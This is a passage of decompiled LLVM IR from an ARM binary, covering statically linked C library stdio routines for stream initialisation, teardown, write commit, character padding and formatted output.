  %v1_100d0 = load i32, i32* @sb, align 4
  %v2_100d0 = add i32 %v1_100d0, 16
  %v3_100d0 = inttoptr i32 %v2_100d0 to i32*
  store i32 %v0_100d0, i32* %v3_100d0, align 4
  br i1 %v2_100b8, label %dec_label_pc_1018c, label %dec_label_pc_100d8

dec_label_pc_100d8:                               ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_100dc = load i32, i32* @fp, align 4
  %v2_100dc = add i32 %v0_100dc, 36
  %v3_100dc = inttoptr i32 %v2_100dc to i32*
  %v4_100dc = load i32, i32* %v3_100dc, align 4
  store i32 %v4_100dc, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_100e4 = add i32 %v0_100dc, 112
  %v3_100e4 = inttoptr i32 %v2_100e4 to i32*
  %v4_100e4 = load i32, i32* %v3_100e4, align 4
  store i32 %v4_100e4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_100ec = ptrtoint i32* %stack_var_-56 to i32
  %v2_100f0 = add i32 %v0_100dc, 76
  %v3_100f0 = inttoptr i32 %v2_100f0 to i32*
  %v4_100f0 = load i32, i32* %v3_100f0, align 4
  store i32 %v4_100dc, i32* %r1.global-to-local, align 4
  store i32 %v4_100e4, i32* %r2.global-to-local, align 4
  store i32 %v2_100ec, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_100f0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1010c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1010c, i32* %r0.global-to-local, align 4
  %v0_10110 = load i32, i32* @fp, align 4
  %v2_10110 = add i32 %v0_10110, 16
  %v3_10110 = inttoptr i32 %v2_10110 to i32*
  %v4_10110 = load i32, i32* %v3_10110, align 4
  call void @__pseudo_branch(i32 %v4_10110)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_10120 = load i32, i32* @fp, align 4
  %v2_10120 = add i32 %v0_10120, 100
  %v3_10120 = inttoptr i32 %v2_10120 to i32*
  %v4_10120 = load i32, i32* %v3_10120, align 4
  store i32 %v4_10120, i32* %r4.global-to-local, align 4
  %v0_10124 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10124, i32* %r1.global-to-local, align 4
  store i32 %v4_10120, i32* %r2.global-to-local, align 4
  store i32 %v2_fedc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_100f0)
  store i32 %v4_10120, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10110)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_10148 = load i32, i32* @fp, align 4
  %v2_10148 = add i32 %v0_10148, 48
  %v3_10148 = inttoptr i32 %v2_10148 to i32*
  %v4_10148 = load i32, i32* %v3_10148, align 4
  store i32 %v4_10148, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_10150 = inttoptr i32 %v4_10148 to i32*
  %v2_10150 = load i32, i32* %v1_10150, align 4
  store i32 %v2_10150, i32* %r2.global-to-local, align 4
  store i32 %v2_fedc, i32* %r0.global-to-local, align 4
  %v1_10158 = load i32, i32* @sb, align 4
  %v2_10158 = add i32 %v1_10158, 32
  %v3_10158 = inttoptr i32 %v2_10158 to i32*
  store i32 %v2_10150, i32* %v3_10158, align 4
  %v0_1015c = load i32, i32* @fp, align 4
  %v1_1015c = load i32, i32* %r3.global-to-local, align 4
  %v2_1015c = add i32 %v1_1015c, %v0_1015c
  %v3_1015c = inttoptr i32 %v2_1015c to i32*
  %v4_1015c = load i32, i32* %v3_1015c, align 4
  store i32 %v4_1015c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10164 = load i32, i32* @sb, align 4
  %v1_10164 = load i32, i32* @ip, align 4
  %v2_10164 = inttoptr i32 %v1_10164 to i32*
  store i32 %v0_10164, i32* %v2_10164, align 4
  call void @__pseudo_branch(i32 %v4_1015c)
  store i32 %v2_100ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1015c)
  br label %dec_label_pc_1018c

dec_label_pc_10188:                               ; preds = %dec_label_pc_ff1c, %dec_label_pc_ff08, %dec_label_pc_ff28
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %bb42, %dec_label_pc_ff60, %dec_label_pc_100d8, %dec_label_pc_10188
  %v0_1018c = load i32, i32* @sb, align 4
  store i32 %v0_1018c, i32* %r0.global-to-local, align 4
  %v2_10194 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10194, i32* @r4, align 4
  store i32 %v6_fec8, i32* @r5, align 4
  store i32 %v9_fec8, i32* @r6, align 4
  store i32 %v18_fec8, i32* @sb, align 4
  store i32 %v24_fec8, i32* @fp, align 4
  ret i32 %v0_1018c

; uselistorder directives
  uselistorder i32 %v1_1008c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_10020, { 1, 2, 0 }
  uselistorder i32 %v0_ffec, { 1, 0 }
  uselistorder i32 %v1_ffb0, { 1, 0 }
  uselistorder i32 %v0_ffb0, { 1, 0 }
  uselistorder i32 %v1_ff98, { 1, 0, 2 }
  uselistorder i32 %v1_ff50, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1018c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10188, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10068, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_ffe0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ff88, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_ff38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff08, { 1, 2, 0 }
}

define i32 @function_101a0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_101a0:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_101a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_101a0, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_101a0
  %v3_101a8 = and i32 %arg4, %arg3
  %v2_101ac = trunc i32 %v3_101a8 to i16
  %v4_101ac = inttoptr i32 %v3_101a8 to i16*
  store i16 %v2_101ac, i16* %v4_101ac, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_101a0, %bb
  %v10_101cc = phi i32 [ %tmp, %dec_label_pc_101a0 ], [ 0, %bb ]
  ret i32 %v10_101cc

; uselistorder directives
  uselistorder i32 %v3_101a8, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_101d4 = call i32 @__GI___errno_location()
  store i32 %v0_101d4, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_101e0 = inttoptr i32 %v0_101d4 to i32*
  %v2_101e0 = load i32, i32* %v1_101e0, align 4
  store i32 %v2_101e0, i32* @r6, align 4
  %v1_101e4 = call i32 @isatty(i32 0)
  %v2_101ec = icmp eq i32 %v1_101e4, 0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  br i1 %v2_101ec, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_101f8 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1912) to i16*), align 4
  %v7_101f8 = zext i16 %v5_101f8 to i32
  %v2_101fc = xor i32 %v7_101f8, 256
  store i32 %v2_101fc, i32* @r3, align 4
  %v2_10200 = trunc i32 %v2_101fc to i16
  store i16 %v2_10200, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1912) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_10208 = call i32 @isatty(i32 1)
  %v2_1020c = icmp eq i32 %v1_10208, 0
  br i1 %v2_1020c, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_10214 = load i32, i32* @r4, align 4
  %v2_10218 = add i32 %v1_10214, 1992
  %v3_10218 = inttoptr i32 %v2_10218 to i16*
  %v4_10218 = load i16, i16* %v3_10218, align 2
  %v2_1021c = xor i16 %v4_10218, 256
  store i16 %v2_1021c, i16* %v3_10218, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_10224 = load i32, i32* @r6, align 4
  %v1_10224 = load i32, i32* @r5, align 4
  %v2_10224 = inttoptr i32 %v1_10224 to i32*
  store i32 %v0_10224, i32* %v2_10224, align 4
  ret i32 %v1_10208

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -37084), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_10254 = call i32 @memcpy()
  ret i32 %v0_10254
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1026c = load i32, i32* @r4, align 4
  store i32 %v3_1026c, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r6.global-to-local, align 4
  %v4_1027c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 100) to i32*), align 4
  store i32 %v4_1027c, i32* @r0, align 4
  %v1_10280 = call i32 @__stdio_init_mutex(i32 %v4_1027c)
  store i32 %v1_10280, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10288 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 112) to i32*), align 4
  store i32 %v4_10288, i32* @r0, align 4
  %v1_1028c = call i32 @__stdio_init_mutex(i32 %v4_10288)
  store i32 %v1_1028c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_10294 = load i32, i32* %r6.global-to-local, align 4
  %v2_10294 = add i32 %v0_10294, 48
  %v3_10294 = inttoptr i32 %v2_10294 to i32*
  %v4_10294 = load i32, i32* %v3_10294, align 4
  store i32 %v4_10294, i32* %r3.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  %v1_1029c = inttoptr i32 %v4_10294 to i32*
  %v2_1029c = load i32, i32* %v1_1029c, align 4
  store i32 %v2_1029c, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_102e85 = add i32 %v2_1029c, 56
  store i32 %v1_102e85, i32* @r5, align 4
  %v2_102ec7 = icmp eq i32 %v2_1029c, 0
  store i32 %v1_102e85, i32* %r0.global-to-local, align 4
  br i1 %v2_102ec7, label %dec_label_pc_102f8, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %entry, %dec_label_pc_102dc.dec_label_pc_102a8_crit_edge
  %v1_102a8 = phi i32 [ %v1_102a8.pre, %dec_label_pc_102dc.dec_label_pc_102a8_crit_edge ], [ 44, %entry ]
  %v0_102a8 = phi i32 [ %v0_102fc.pre, %dec_label_pc_102dc.dec_label_pc_102a8_crit_edge ], [ %v0_10294, %entry ]
  %v2_102a8 = add i32 %v0_102a8, %v1_102a8
  %v3_102a8 = inttoptr i32 %v2_102a8 to i32*
  %v4_102a8 = load i32, i32* %v3_102a8, align 4
  store i32 %v4_102a8, i32* @ip, align 4
  store i32 66228, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_102a8)
  %v0_102b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_102b4 = icmp eq i32 %v0_102b4, 0
  %v0_102b8 = load i32, i32* @r5, align 4
  store i32 %v0_102b8, i32* @r0, align 4
  br i1 %v2_102b4, label %dec_label_pc_102dc, label %dec_label_pc_102c0

dec_label_pc_102c0:                               ; preds = %dec_label_pc_102a8
  %v0_102c0 = load i32, i32* @r4, align 4
  %v1_102c0 = add i32 %v0_102c0, 8
  %v2_102c0 = inttoptr i32 %v1_102c0 to i32*
  %v3_102c0 = load i32, i32* %v2_102c0, align 4
  store i32 %v3_102c0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_102c8 = add i32 %v0_102c0, 20
  %v3_102c8 = inttoptr i32 %v2_102c8 to i32*
  store i32 %v3_102c0, i32* %v3_102c8, align 4
  %v0_102cc = load i32, i32* %r2.global-to-local, align 4
  %v1_102cc = trunc i32 %v0_102cc to i16
  %v2_102cc = load i32, i32* @r4, align 4
  %v3_102cc = inttoptr i32 %v2_102cc to i16*
  store i16 %v1_102cc, i16* %v3_102cc, align 2
  %v0_102d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_102d0 = load i32, i32* @r4, align 4
  %v2_102d0 = add i32 %v1_102d0, 24
  %v3_102d0 = inttoptr i32 %v2_102d0 to i32*
  store i32 %v0_102d0, i32* %v3_102d0, align 4
  %v0_102d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_102d4 = load i32, i32* @r4, align 4
  %v2_102d4 = add i32 %v1_102d4, 28
  %v3_102d4 = inttoptr i32 %v2_102d4 to i32*
  store i32 %v0_102d4, i32* %v3_102d4, align 4
  %v0_102d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_102d8 = load i32, i32* @r4, align 4
  %v2_102d8 = add i32 %v1_102d8, 16
  %v3_102d8 = inttoptr i32 %v2_102d8 to i32*
  store i32 %v0_102d8, i32* %v3_102d8, align 4
  br label %dec_label_pc_102dc

dec_label_pc_102dc:                               ; preds = %dec_label_pc_102a8, %dec_label_pc_102c0
  %v0_102dc = load i32, i32* %r7.global-to-local, align 4
  %v1_102dc = load i32, i32* @r4, align 4
  %v2_102dc = add i32 %v1_102dc, 52
  %v3_102dc = inttoptr i32 %v2_102dc to i32*
  store i32 %v0_102dc, i32* %v3_102dc, align 4
  %v1_102e0 = call i32 @__stdio_init_mutex(i32 %v0_102b8)
  store i32 %v1_102e0, i32* %r0.global-to-local, align 4
  %v0_102e4 = load i32, i32* @r4, align 4
  %v1_102e4 = add i32 %v0_102e4, 32
  %v2_102e4 = inttoptr i32 %v1_102e4 to i32*
  %v3_102e4 = load i32, i32* %v2_102e4, align 4
  store i32 %v3_102e4, i32* @r4, align 4
  %v1_102e8 = add i32 %v3_102e4, 56
  store i32 %v1_102e8, i32* @r5, align 4
  %v2_102ec = icmp eq i32 %v3_102e4, 0
  store i32 %v1_102e8, i32* %r0.global-to-local, align 4
  %v0_102fc.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_102ec, label %dec_label_pc_102f8, label %dec_label_pc_102dc.dec_label_pc_102a8_crit_edge

dec_label_pc_102dc.dec_label_pc_102a8_crit_edge:  ; preds = %dec_label_pc_102dc
  %v1_102a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_102a8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102dc, %entry
  %v1_1032814 = phi i32 [ %v1_102e85, %entry ], [ %v1_102e8, %dec_label_pc_102dc ]
  %v0_102fc = phi i32 [ %v0_10294, %entry ], [ %v0_102fc.pre, %dec_label_pc_102dc ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_102fc = add i32 %v0_102fc, 48
  %v3_102fc = inttoptr i32 %v2_102fc to i32*
  %v4_102fc = load i32, i32* %v3_102fc, align 4
  store i32 %v4_102fc, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_102fc to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_1031c4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1031c4, label %dec_label_pc_10324, label %dec_label_pc_10308

dec_label_pc_10308:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_1031c
  %v1_10310 = phi i32 [ %storemerge, %dec_label_pc_1031c ], [ %storemerge2, %dec_label_pc_102f8 ]
  %v1_10308 = inttoptr i32 %v1_10310 to i16*
  %v2_10308 = load i16, i16* %v1_10308, align 2
  %v3_10308 = zext i16 %v2_10308 to i32
  store i32 %v3_10308, i32* %r3.global-to-local, align 4
  %v1_1030c = and i32 %v3_10308, 64
  %v2_1030c = icmp eq i32 %v1_1030c, 0
  br i1 %v2_1030c, label %dec_label_pc_1031c, label %bb

bb:                                               ; preds = %dec_label_pc_10308
  store i32 %v1_10310, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1031c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10308, %bb
  %v1_10314 = xor i1 %v2_1030c, true
  call void @__pseudo_cond_branch(i1 %v1_10314, i32 ptrtoint (i32* @global_var_10340.623 to i32))
  %v0_10318 = load i32, i32* %r4.global-to-local, align 4
  %v1_10318 = add i32 %v0_10318, 32
  %storemerge.in = inttoptr i32 %v1_10318 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_1031c = icmp eq i32 %storemerge, 0
  br i1 %v2_1031c, label %dec_label_pc_1031c.dec_label_pc_10324_crit_edge, label %dec_label_pc_10308

dec_label_pc_1031c.dec_label_pc_10324_crit_edge:  ; preds = %dec_label_pc_1031c
  %v1_10328.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_1031c.dec_label_pc_10324_crit_edge, %dec_label_pc_102f8
  %v1_10328 = phi i32 [ %v1_10328.pre, %dec_label_pc_1031c.dec_label_pc_10324_crit_edge ], [ %v1_1032814, %dec_label_pc_102f8 ]
  %v2_10324 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10324, i32* %r4.global-to-local, align 4
  ret i32 %v1_10328

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10294, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 1, 2, 5, 7, 3, 4 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1031c, { 1, 0 }
  uselistorder label %dec_label_pc_10308, { 1, 0 }
  uselistorder label %dec_label_pc_102dc, { 1, 0 }
  uselistorder label %dec_label_pc_102a8, { 1, 0 }
}

define i32 @function_10330(i32 %arg1) local_unnamed_addr {
dec_label_pc_10330:
  %v0_10330 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10330, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10330
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10330, %bb
  %v4_1033c = phi i32 [ %arg1, %dec_label_pc_10330 ], [ 0, %bb ]
  ret i32 %v4_1033c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10340 = load i32, i32* @r4, align 4
  store i32 %v3_10340, i32* %stack_var_-8, align 4
  %v0_10344 = load i32, i32* @r0, align 4
  %v1_10344 = add i32 %v0_10344, 8
  %v2_10344 = inttoptr i32 %v1_10344 to i32*
  %v3_10344 = load i32, i32* %v2_10344, align 4
  %v1_10348 = add i32 %v0_10344, 16
  %v2_10348 = inttoptr i32 %v1_10348 to i32*
  %v3_10348 = load i32, i32* %v2_10348, align 4
  %v9_1034c = icmp eq i32 %v3_10348, %v3_10344
  store i32 %v0_10344, i32* %r4.global-to-local, align 4
  br i1 %v9_1034c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10344, i32* %v2_10348, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_10358 = xor i1 %v9_1034c, true
  call void @__pseudo_cond_branch(i1 %v1_10358, i32 ptrtoint (i32* @global_var_15d4c.624 to i32))
  %v0_1035c = load i32, i32* %r4.global-to-local, align 4
  %v1_1035c = add i32 %v0_1035c, 8
  %v2_1035c = inttoptr i32 %v1_1035c to i32*
  %v3_1035c = load i32, i32* %v2_1035c, align 4
  %v1_10360 = add i32 %v0_1035c, 16
  %v2_10360 = inttoptr i32 %v1_10360 to i32*
  %v3_10360 = load i32, i32* %v2_10360, align 4
  %v2_10364 = sub i32 %v3_10360, %v3_1035c
  %v2_10368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10368, i32* @r4, align 4
  ret i32 %v2_10364

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_10370 = load i32, i32* @r4, align 4
  %v6_10370 = load i32, i32* @r5, align 4
  %v9_10370 = load i32, i32* @r6, align 4
  %v12_10370 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_1037c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_1037c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_103942 = icmp eq i32 %arg3, 0
  br i1 %v2_103942, label %dec_label_pc_103b4, label %dec_label_pc_103a8

dec_label_pc_10390:                               ; preds = %dec_label_pc_103a8
  %v1_10390 = add i32 %v0_10390, -1
  store i32 %v1_10390, i32* @r4, align 4
  %v2_10394 = icmp eq i32 %v1_10390, 0
  %v0_103a0 = load i32, i32* @r7, align 4
  br i1 %v2_10394, label %dec_label_pc_103b4.loopexit, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %entry, %dec_label_pc_10390
  %v0_103a04 = phi i32 [ %v0_103a0, %dec_label_pc_10390 ], [ %arg1, %entry ]
  %v3_103a8 = inttoptr i32 %v0_103a04 to i16*
  %v4_103a8 = call i32 @__stdio_fwrite(i32 %v10_1037c, i32 1, i16* %v3_103a8)
  %v7_103ac = icmp eq i32 %v4_103a8, 1
  %v0_10390 = load i32, i32* @r4, align 4
  br i1 %v7_103ac, label %dec_label_pc_10390, label %dec_label_pc_103b4.loopexit

dec_label_pc_103b4.loopexit:                      ; preds = %dec_label_pc_10390, %dec_label_pc_103a8
  %v0_103b4.ph = phi i32 [ %v0_10390, %dec_label_pc_103a8 ], [ 0, %dec_label_pc_10390 ]
  %v1_103b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_103b4

dec_label_pc_103b4:                               ; preds = %dec_label_pc_103b4.loopexit, %entry
  %v1_103b4 = phi i32 [ 0, %entry ], [ %v1_103b4.pre, %dec_label_pc_103b4.loopexit ]
  %v0_103b4 = phi i32 [ 0, %entry ], [ %v0_103b4.ph, %dec_label_pc_103b4.loopexit ]
  %v2_103b4 = sub i32 %v1_103b4, %v0_103b4
  store i32 %v3_10370, i32* @r4, align 4
  store i32 %v6_10370, i32* @r5, align 4
  store i32 %v9_10370, i32* @r6, align 4
  store i32 %v12_10370, i32* @r7, align 4
  ret i32 %v2_103b4

; uselistorder directives
  uselistorder i32 %v1_10390, { 1, 0 }
  uselistorder label %dec_label_pc_103b4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_103a8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_103c4 = load i32, i32* @r4, align 4
  store i32 %v3_103c4, i32* %stack_var_-24, align 4
  %v6_103c4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_103cc = and i32 %arg2, 128
  %v2_103cc = icmp eq i32 %v1_103cc, 0
  %v0_103d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_103d0, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_103cc, label %dec_label_pc_10420thread-pre-split, label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_103e8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_103e8, i32* %r0.global-to-local, align 4
  %v1_103ec = load i32, i32* %r4.global-to-local, align 4
  %v2_103ec = sub i32 %v1_103ec, %v3_103e8
  store i32 %v2_103ec, i32* @r4, align 4
  store i32 %v3_103e8, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_103ec, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_10400

.thread:                                          ; preds = %dec_label_pc_103e4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1041c

dec_label_pc_10400:                               ; preds = %dec_label_pc_103e4
  %v0_10400 = load i32, i32* @r5, align 4
  %v1_10400 = urem i32 %v0_10400, 128
  %v0_10404 = load i32, i32* @r8, align 4
  store i32 %v0_10404, i32* %r0.global-to-local, align 4
  %v3_1040c = trunc i32 %v1_10400 to i8
  %v4_1040c = call i32 @_charpad(i32 %v0_10404, i8 %v3_1040c, i32 %v2_103ec)
  store i32 %v4_1040c, i32* %r0.global-to-local, align 4
  %v1_10410 = load i32, i32* @r4, align 4
  %v9_10410 = icmp eq i32 %v4_1040c, %v1_10410
  store i32 %v4_1040c, i32* %r5.global-to-local, align 4
  br i1 %v9_10410, label %dec_label_pc_10400.dec_label_pc_1041c_crit_edge, label %dec_label_pc_1043c

dec_label_pc_10400.dec_label_pc_1041c_crit_edge:  ; preds = %dec_label_pc_10400
  %v0_1041c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1041c

dec_label_pc_1041c:                               ; preds = %.thread, %dec_label_pc_10400.dec_label_pc_1041c_crit_edge
  %v0_1041c = phi i32 [ %v0_1041c.pre, %dec_label_pc_10400.dec_label_pc_1041c_crit_edge ], [ %v3_103e8, %.thread ]
  store i32 %v0_1041c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10420

dec_label_pc_10420thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %dec_label_pc_10420thread-pre-split, %dec_label_pc_1041c
  %v5_1042c = phi i32 [ %arg3, %dec_label_pc_10420thread-pre-split ], [ %v0_1041c, %dec_label_pc_1041c ]
  %tmp14 = icmp slt i32 %v5_1042c, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_10420
  br label %bb15

bb:                                               ; preds = %dec_label_pc_10420
  %v5_10428 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_10428, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_15e00.625 to i32))
  %v0_10438 = load i32, i32* %r5.global-to-local, align 4
  %v2_10438 = add i32 %storemerge, %v0_10438
  store i32 %v2_10438, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_10400, %bb15
  %v0_1043c = phi i32 [ %v4_1040c, %dec_label_pc_10400 ], [ %v2_10438, %bb15 ]
  store i32 %v0_1043c, i32* %r0.global-to-local, align 4
  %v2_10440 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10440, i32* %r4.global-to-local, align 4
  store i32 %v6_103c4, i32* %r5.global-to-local, align 4
  ret i32 %v0_1043c

; uselistorder directives
  uselistorder i32 %v0_1043c, { 1, 0 }
  uselistorder i32 %v0_1041c, { 1, 0 }
  uselistorder i32 %v2_103ec, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1043c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_1041c, { 1, 0 }
}

